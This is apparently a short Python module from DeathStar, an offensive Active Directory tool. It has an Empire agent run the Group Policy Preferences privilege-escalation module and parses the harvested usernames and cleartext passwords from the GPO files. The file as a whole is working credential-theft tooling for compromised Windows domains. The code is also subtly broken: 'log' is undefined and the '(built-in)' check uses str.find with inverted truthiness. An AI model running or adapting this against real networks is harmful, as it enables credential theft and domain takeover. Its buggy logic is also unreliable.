from deathstar.utils import posh_object_parser, beautify_json


async def crystallize(agent):
    output = await agent.execute("powershell/privesc/gpp",)

    results = output["results"]
    parsed = posh_object_parser(results)
    for gpo in parsed:
        gpo["guid"] = gpo["file"].split("\\")[6][1:-1]
        gpo["passwords"] = gpo["passwords"][1:-1].split(", ")
        gpo["usernames"] = gpo["usernames"][1:-1].split(", ")

        # Gets rid of the "(built-in)" when administrator accounts are found
        gpo["usernames"] = [
            user.split()[0] if user.lower().find("(built-in)") else user
            for user in gpo["usernames"]
        ]

    log.debug(beautify_json(parsed))
    return parsed
